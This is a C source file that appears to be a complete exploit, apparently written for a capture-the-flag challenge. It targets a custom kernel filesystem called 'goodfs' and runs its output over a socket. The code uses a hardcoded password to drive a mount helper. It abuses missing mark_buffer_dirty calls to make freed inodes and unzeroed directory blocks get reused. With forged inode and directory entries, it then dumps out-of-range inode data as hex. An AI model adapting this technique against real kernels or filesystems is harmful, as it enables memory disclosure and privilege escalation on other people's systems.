#define SOCKFD 5
#define SOCK fdopen(SOCKFD)
#define printf(...) fprintf(SOCK, ##__VA_ARGS__)

/** syscall wrappers **/
void exit_group(int code) {
    __syscall(231, code);
}

void xmkdir(const char *path, int mode) {
    int res = mkdir(path, mode);
    if(res < 0) {
        printf("mkdir %s failed: %d\n", path, res);
        exit_group(1);
    }
}

int getdents64(int fd, void *dents, int size) {
    return __syscall(217, fd, dents, size);
}

void my_xutime(const char *path, unsigned long long atime, unsigned long long mtime) {
    unsigned long long timebuf[2];
    timebuf[0] = atime;
    timebuf[1] = mtime;
    int res = __syscall(132, path, timebuf);
    if(res < 0) {
        printf("utime %s failed: %d\n", path, res);
        exit_group(1);
    }
}

/** utilities **/
void pause(const char *msg) {
    printf("%s", msg);
    char buf[1];
    read(SOCKFD, buf, 1);
}

/** goodfs stuff **/
struct mounter_shmem {
    int flag;
    char password[256];
    char command[256];
    char arguments[256];
};

int mount_cmd(char *command, char *arguments) {
    int mfd = open("/run/mount_shm", 2, 0);
    void *maddr = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, mfd, 0);
    struct mounter_shmem *m = (struct mounter_shmem *)maddr;
    strcpy(m->password, "MGhtT34gHj5yFcszRYB4gf45DtymEi");
    strcpy(m->command, command);
    strcpy(m->arguments, arguments);
    m->flag = 1;
    struct timespec sleeptime;
    sleeptime.tv_sec = 0;
    sleeptime.tv_nsec = 1000000;
    while(m->flag == 1)
      nanosleep(&sleeptime, NULL);
    int res = m->flag;
    munmap(maddr, 0x1000);
    close(mfd);
    return res;
}

void do_mount() {
    int res = mount_cmd("mount", "goodfs");
    if(res != 2) {
        printf("mount failed: %d\n", res);
        exit_group(1);
    }
}

void do_umount() {
    int res = mount_cmd("umount", "goodfs");
    if(res != 2) {
        printf("mount failed: %d\n", res);
        exit_group(1);
    }
}

/** ls replacement **/
struct linux_dirent64 {
    uint64_t ino;
    uint64_t off;
    short reclen;
    char type;
    char name[1];
};

void showstat(const char *path, int raw) {
    /* Open with O_PATH to simulate stat() */
    int fd = open(path, 010000000, 0);
    if(fd < 0) {
        printf("[open err: %d]\n", fd);
        return;
    }
    struct stat stat;
    int res = fstat(fd, &stat);
    if(res < 0) {
        printf("[stat err: %d]\n", res);
        close(fd);
        return;
    }

    if(!raw) {
        char mode[8];
        for(int i=0; i<7; i++) {
          mode[i] = '0' + ((stat.st_mode >> ((6 - i) * 3)) & 7);
        }
        mode[7] = 0;
        printf("uidgid=%d:%d amtime=%d:%d mode=%s size=%d devino=%d:%d nlink=%d\n",
            stat.st_uid, stat.st_gid,
            stat.st_atime, stat.st_mtime,
            mode, stat.st_size,
            stat.st_dev, stat.st_ino, stat.st_nlink);
    } else {
        unsigned char inode[32];
        memcpy(&inode[0], &stat.st_uid, 4);
        memcpy(&inode[4], &stat.st_gid, 4);
        memcpy(&inode[8], &stat.st_atime, 8);
        memcpy(&inode[16], &stat.st_mtime, 8);
        memset(&inode[24], 0xcc, 2);
        memcpy(&inode[26], &stat.st_mode, 2);
        memcpy(&inode[28], &stat.st_size, 4);
        for(int i=0; i<32; i++) {
            printf("%x%x", inode[i] >> 4, inode[i] & 0xf);
        }
        printf("\n");
    }

    close(fd);
}

void lsdir(const char *path) {
    char newpath[4096];
    char dents[32768];
    int dfd = open(path, O_DIRECTORY | O_RDONLY, 0);
    while(1) {
        int nbytes = getdents64(dfd, dents, 32768);
        if(nbytes <= 0)
            break;
        int ptr = 0;
        while(ptr < nbytes) {
            struct linux_dirent64 *s = (struct linux_dirent64 *)&dents[ptr];
            printf("ino=%d off=%d type=%d name=%s ", s->ino, s->off, s->type, s->name);
            sprintf(newpath, "%s/%s", path, s->name);
            showstat(newpath, 0);
            ptr += s->reclen;
        }
    }
    close(dfd);
}

struct goodfs_inode {
  int uid, gid;
  uint64_t atime, mtime;
  unsigned short data_block, mode;
  int size;
};

struct goodfs_dir_entry {
    int ino;
    char name[32];
};

/* Init corrupted filesystem.

Key entries:

/mnt/goodfs/public/inodes: inode 5, editable inode data for fake inodes 892~923
/mnt/goodfs/public/dirents: inode 6, editable directory entries
/mnt/goodfs/public/raw/: contains several inodes: 0~7 and 892~899
*/
void init_fs() {
    int fd;

    /* Make a file to hold fake superblock inodes */
    struct goodfs_inode inodes[3];
    // Only directories use data_block
    inodes[0].uid = 1337;
    inodes[0].gid = 1337;
    inodes[0].atime = 1337;
    inodes[0].mtime = 1337;
    inodes[0].data_block = 0;
    inodes[0].mode = 040777;
    inodes[0].size = 4096;

    inodes[1].uid = 1337;
    inodes[1].gid = 1337;
    inodes[1].atime = 1337;
    inodes[1].mtime = 1337;
    inodes[1].data_block = 1;
    inodes[1].mode = 040777;
    inodes[1].size = 4096;

    inodes[2].uid = 1337;
    inodes[2].gid = 1337;
    inodes[2].atime = 1337;
    inodes[2].mtime = 1337;
    inodes[2].data_block = 8;
    inodes[2].mode = 040777;
    inodes[2].size = 4096;

    // Writing to this file will modify the inode data for inodes 892~899
    fd = open("/mnt/goodfs/public/inodes", O_CREAT | O_RDWR, 0777);
    write(fd, inodes, sizeof(inodes));
    close(fd);

    // Writing to this file will modify the directory entries for data block 8
    fd = open("/mnt/goodfs/public/dirents", O_CREAT | O_RDWR, 0777);
    close(fd);

    /* Allocate enough inodes to spill the new inodes into the second superblock block */
    xmkdir("/mnt/goodfs/public/hack", 0777);
    xmkdir("/mnt/goodfs/public/hack/d0", 0777);
    xmkdir("/mnt/goodfs/public/hack/d1", 0777);
    xmkdir("/mnt/goodfs/public/hack/d2", 0777);
    xmkdir("/mnt/goodfs/public/hack/d3", 0777);
    xmkdir("/mnt/goodfs/public/hack/d4", 0777);
    xmkdir("/mnt/goodfs/public/hack/d5", 0777);
    xmkdir("/mnt/goodfs/public/hack/d6", 0777);
    xmkdir("/mnt/goodfs/public/hack/d7", 0777);
    for(int i=0; i<110; i++) {
        char path[256];
        sprintf(path, "/mnt/goodfs/public/hack/d%d/f%d", i / 16, i % 16);
        fd = open(path, O_CREAT | O_RDWR, 0666);
        if(fd < 0) {
            printf("failed to create %s: %d\n", path, fd);
        }
        close(fd);
    }
    /* prevent create from propagating atime change to root inodes */
    my_xutime("/mnt/goodfs/public/hack", 0x7fffffff, 0x7fffffff);
    do_umount();

    do_mount();
    /* When creating this inode, the free bitmap update (on the first superblock block)
       will not be committed because of a missing mark_buffer_dirty.
       The inode itself is created on the second superblock block. */
    fd = open("/mnt/goodfs/public/hack/fd1", O_CREAT | O_RDWR, 0777);
    struct goodfs_dir_entry entries[16];
    for(int i=0; i<8; i++) {
        entries[i].ino = i;
        sprintf(entries[i].name, "i%d", i);
    }
    for(int i=0; i<8; i++) {
        entries[i+8].ino = i+892;
        sprintf(entries[i+8].name, "i%d", i+892);
    }
    write(fd, entries, sizeof(entries));
    close(fd);
    do_umount();

    do_mount();
    /* This directory inode will reuse the "fd1" inode. Due to another missing
       mark_buffer_dirty, the zeroing of the data block will not be committed. */
    xmkdir("/mnt/goodfs/public/raw", 0777);
    do_umount();

    do_mount();
}

int main() {
    int fd;

    do_mount();

    fd = open("/mnt/goodfs/public/raw", O_DIRECTORY | O_RDONLY, 0777);
    if(fd < 0) {
        printf("Init fs\n");
        init_fs();
    }
    close(fd);

    do_umount();

    do_mount();

    /* The file /dirents and the directory /raw/i894 have the same data block,
       allowing us to write directory entries to /dirents and read them back
       out in /raw/i894. */
    for(int offset = -131; offset < 32; offset += 32) {
        fd = open("/mnt/goodfs/public/dirents", O_RDWR, 0777);
        if(fd >= 0) {
            struct goodfs_dir_entry entries[32];
            for(int i=0; i<32; i++) {
                entries[i].ino = offset + i;
                sprintf(entries[i].name, "hack%d", offset + i);
            }
            write(fd, entries, sizeof(entries));
            close(fd);
        } else {
            printf("failed to open /dirents: %d\n", fd);
        }
        for(int i=0; i<32; i++) {
            char path[256];
            sprintf(path, "/mnt/goodfs/public/raw/i894/hack%d", offset + i);
            showstat(path, 1);
        }
    }

    do_umount();

    exit_group(0);
}
